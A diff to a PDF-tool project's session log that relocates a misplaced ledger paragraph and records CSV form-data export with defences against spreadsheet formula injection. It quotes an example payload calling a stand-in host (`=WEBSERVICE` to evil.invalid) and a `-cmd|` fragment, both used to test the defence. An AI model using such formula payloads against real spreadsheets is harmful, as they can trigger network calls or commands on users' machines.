@@ -33117,6 +33117,41 @@ posture could both use an operator/engineer-authored update reflecting
 this session's findings; this librarian has flagged both, not edited
 either.
 
+**Ledger for this filing.** **No new Pass ID** — `f83be5a` filed against
+the existing `Pass 20.0`. Pass-family ceiling unchanged at **61.0**,
+next free **62**. One commit cited by hash (`f83be5a`) for
+`check-commits-filed.py`'s literal-hash join. `docs/FEATURES.md`: one
+row addendum (*CREATE a form field*), one new *Implemented* row (XFA
+presence), one *Planned* row amended (Encryption), one new *Planned* row
+(static-XFA hybrid read/fill), one *Cannot*-section line broadened
+(AEM DRM + third-party handlers). `docs/ARCHITECTURE.md`: **one new
+dated §12 entry** (2026-08-11, the DRM server-mediation scope
+boundary). **Standing rules: no new mint** — R151 and R170 both cited;
+ceiling stays **R185**, next free **R186**. Decision-record ceiling
+unchanged at **038**, next free **039** — both new pieces are Backlog/
+plain-§12 content, not numbered `docs/decisions/` records. **No
+`D:\dev\rag\rust\`/`egui\` finding. No `C:\personal_rag\pdf\` finding.**
+**Operator-question ceiling moves `(bh)` → `(bi)`, next free `(bj)`** —
+new question filed OPEN (strip protection without a password). Gate
+figures relayed per the operator's dispatch — `cargo test -p pdfce-core
+--lib` **1494 passed, 0 failed** (NOT reconciled against 1485+8=1493,
+see the `ROADMAP.md` entry); `cargo clippy --workspace --all-targets
+--all-features` **0**; `cargo fmt --check` clean — **none independently
+re-run, no shell this dispatch** (hard rule 8). **Backup/git working-tree
+state not asserted anywhere in this filing** — check
+`D:\Dev\pdfce-backups\` and `git log`/`git status` directly. This is the
+**eighty-eighth** `SESSION_LOG.md`/`ROADMAP.md` joint filing (the
+eighty-seventh confirmed present by direct read before this entry was
+written).
+
+**Placement corrected 2026-08-11.** This paragraph was written into the
+eighty-NINTH filing's section, below an entry it does not describe, while
+the eighty-eighth had no ledger at all. Moved here, under the header it
+belongs to. Flagged by `pdfce-librarian` as the paragraph "appearing
+twice" — it did not: there was one copy, in the wrong place. Recorded
+because the distinction changes the fix, and deleting the "duplicate"
+would have destroyed the eighty-eighth filing's only ledger.
+
 ## 2026-08-11 (eighty-ninth filing) — two guards that failed OPEN (`5039ecf`, `ce5642d`), found back to back and closed the same session `R186` names the shape they share; `30c0940` discharges `f83be5a`'s own R151 debt; `96a6065` closes three format markers and FALSIFIES a prior weakly-sourced reproduction; a test-count discrepancy flagged eighty-eighth filing is fully reconciled
 
 **Shipped:**
@@ -33251,29 +33286,114 @@ git working-tree state not asserted anywhere in this filing** — check
 eighty-eighth confirmed present by direct read before this entry was
 written).
 
-**Ledger for this filing.** **No new Pass ID** — `f83be5a` filed against
-the existing `Pass 20.0`. Pass-family ceiling unchanged at **61.0**,
-next free **62**. One commit cited by hash (`f83be5a`) for
-`check-commits-filed.py`'s literal-hash join. `docs/FEATURES.md`: one
-row addendum (*CREATE a form field*), one new *Implemented* row (XFA
-presence), one *Planned* row amended (Encryption), one new *Planned* row
-(static-XFA hybrid read/fill), one *Cannot*-section line broadened
-(AEM DRM + third-party handlers). `docs/ARCHITECTURE.md`: **one new
-dated §12 entry** (2026-08-11, the DRM server-mediation scope
-boundary). **Standing rules: no new mint** — R151 and R170 both cited;
-ceiling stays **R185**, next free **R186**. Decision-record ceiling
-unchanged at **038**, next free **039** — both new pieces are Backlog/
-plain-§12 content, not numbered `docs/decisions/` records. **No
-`D:\dev\rag\rust\`/`egui\` finding. No `C:\personal_rag\pdf\` finding.**
-**Operator-question ceiling moves `(bh)` → `(bi)`, next free `(bj)`** —
-new question filed OPEN (strip protection without a password). Gate
-figures relayed per the operator's dispatch — `cargo test -p pdfce-core
---lib` **1494 passed, 0 failed** (NOT reconciled against 1485+8=1493,
-see the `ROADMAP.md` entry); `cargo clippy --workspace --all-targets
---all-features` **0**; `cargo fmt --check` clean — **none independently
-re-run, no shell this dispatch** (hard rule 8). **Backup/git working-tree
-state not asserted anywhere in this filing** — check
-`D:\Dev\pdfce-backups\` and `git log`/`git status` directly. This is the
-**eighty-eighth** `SESSION_LOG.md`/`ROADMAP.md` joint filing (the
-eighty-seventh confirmed present by direct read before this entry was
-written).
+
+## 2026-08-11 (ninetieth filing) — `a64b5fd`+`23eee9b`: form data as CSV (`Pass 62.0`, core+CLI+GUI); a CSV cell is not inert — an unneutralised formula-triggering value is a second route to the network R12 already refuses; a project gate overruled a deliberate judgement call and was right to
+
+**Shipped:**
+- `a64b5fd` — `crates/pdfce-core/src/formcsv.rs` (11 tests): two-column
+  `name,value` RFC 4180 CSV export/import, `pdfce-cli export-data
+  --format csv` / `import-data`. Core + CLI.
+- `23eee9b` — CSV reaches the GUI's existing Export data / Import data
+  buttons. GUI. Filed together as `Pass 62.0`.
+
+**Decisions made this session:**
+- **A CSV cell beginning `=`/`+`/`-`/`@` is a live spreadsheet formula,
+  not text, and an unneutralised form value is a second route to the
+  network R12 already refuses inside pdfce's own tree** — writing
+  `=WEBSERVICE(...)` unescaped hands the fetch to the spreadsheet
+  instead of opening a socket itself, same capability, longer route.
+  Export neutralises with a leading apostrophe; every neutralised
+  field is COUNTED AND NAMED (R181's shape); import REVERSES it
+  exactly, so a round trip through a real spreadsheet does not
+  accumulate apostrophes. Verified end to end on
+  `=WEBSERVICE("http://evil.invalid")`.
+- **`-` is neutralised too, deliberately conservatively**, even though
+  a negative number is the commoner reason a value starts with one —
+  the first character alone cannot distinguish `-5` from `-cmd|...`,
+  and refusing such exports outright was judged the worse trade.
+- **Two columns (`name,value`), not one column per field.** The wide,
+  one-row-per-document shape (batch-filling many copies of one form)
+  is a distinct, unscoped feature — filed to `ROADMAP.md` *Backlog*,
+  not built here.
+- A malformed import row (wrong column count) or an empty import file
+  REFUSES rather than risking a destructive partial read (a lost value
+  column would otherwise read as names with blank values and erase a
+  form).
+- Format detection in both shells is by content, not extension: FDF's
+  `%` header, XFDF's opening `<`, CSV as the untried residue.
+- **`Pass 62.0` minted** for this capability rather than folding it
+  into `Pass 7.1` — CSV is a third interchange format with its own
+  security design and its own operator-facing shape decision, matching
+  the `Pass 37.3` precedent for rich-text.
+
+**Findings + decisions:**
+- **A project gate overruled a deliberate judgement call, correctly.**
+  `check-ui-strings.sh` flagged `", "` (the separator joining field
+  names in a disclosure sentence) as operator-visible copy outside the
+  string catalog. First instinct was that a comma is punctuation and an
+  exemption would be the honest fix — wrong: the separator joins names
+  INSIDE a sentence, so a reword must move the separator with it, and
+  an exemption would have put the two in different files to drift
+  apart silently. Recorded because the gate did not catch a careless
+  mistake here — it overruled a considered decision that would have
+  been defended.
+- **A recurring pattern, flagged rather than fixed or minted:** this is
+  the THIRD consecutive time a capability shipped in core+CLI while the
+  GUI kept its old surface, closed in a same-day follow-up commit
+  rather than the same one. Not filed as an R151 instance (R151 is
+  no-caller-for-days-or-Passes; this is same-session, one commit
+  later) — left as a named observation for a future filing to weigh if
+  a fourth instance lands.
+- **`C:\personal_rag\pdf\`: one new lesson** — "form values exported to
+  CSV are attacker-controlled formula input" — an empirical interchange
+  hazard, not a spec fact, generalising to any tool exporting PDF form
+  data to a spreadsheet format. No `D:\dev\rag\rust\`/`egui\` finding —
+  the gate-script note above is project-local tooling, not
+  Rust/egui-ecosystem-general.
+
+**Still in flight:** the wide/batch CSV shape stays UNSCOPED
+(`ROADMAP.md` *Backlog*) — needs its own Pass and likely reuses the
+existing Batch Tools surface. The recurring core-before-gui pattern
+above is flagged, not resolved.
+
+**For next session:** if a fourth instance of the core-before-gui
+pattern lands, that is probably the point to weigh minting a rule for
+it rather than continuing to note it inline.
+
+**Ledger for this filing.** **New Pass ID minted: `Pass 62.0`.**
+Pass-family ceiling moves **61.0 → 62.0**, next free **63**. Two
+commits cited by hash (`a64b5fd`, `23eee9b`). `docs/FEATURES.md`: one
+new *Implemented* row (*Forms (AcroForm)* — form-data CSV, `core [x]`/
+`cli [x]`/`gui [x]`, `Acrobat ?`); one new *Planned* row (wide/batch
+CSV shape, UNSCOPED). `docs/ARCHITECTURE.md`: **two new dated §12
+entries** (2026-08-11 — the injection-neutralisation design, R12
+cross-referenced; the tall-vs-wide shape decision), plus a §3 module
+note (`formcsv.rs`) and a §7 CLI-capabilities bullet. `docs/ROADMAP.md`
+*Backlog*: one new entry (wide/batch CSV shape). **Standing rules: no
+new mint.** R12, R151, R156, R181 all cited, none minted.
+Decision-record ceiling unchanged at **038**, next free **039** —
+neither §12 entry is a numbered `docs/decisions/` record. **One new
+`C:\personal_rag\pdf\` lesson** (formula-injection interchange hazard)
+— that subject's own `index.md` and the master `C:\personal_rag\
+index.md` both updated this filing. **No `D:\dev\rag\rust\`/`egui\`
+finding.** Operator-question ceiling unchanged at **(bi)**, next free
+**(bj)**. Gate figures relayed per the engineer's own report, measured
+at `23eee9b` — full workspace `cargo test` **81 suites, 3255 passed, 0
+failed**; `cargo clippy --workspace --all-targets --all-features`
+**0**; `cargo fmt --check`, `check-ui-strings.sh`,
+`check-theme-colors.sh` clean; all four filing gates
+(`check-commits-filed.py`/`check-passes-filed.py`/
+`check-ledger-numbers.py`/`check-one-commit-per-command.py`) clean per
+the engineer's own run — **none independently re-run, no shell this
+dispatch** (hard rule 8). **Backup/git working-tree state not asserted
+anywhere in this filing** — check `D:\Dev\pdfce-backups\` and `git
+log`/`git status` directly. This is the **ninetieth**
+`SESSION_LOG.md`/`ROADMAP.md` joint filing (the eighty-ninth confirmed
+present by direct read before this entry was written). **A pre-existing
+filing anomaly noted, not fixed:** the eighty-eighth filing's own
+"Ledger for this filing" paragraph appears TWICE in this file — once
+under its own `## 2026-08-11 (eighty-eighth filing)` header, and again,
+unheaded, immediately after the eighty-ninth filing's entry (the block
+this new entry now follows). Flagged for the engineer; not corrected
+here, since resolving a duplicate append-only block is a judgement call
+outside this filing's scope.
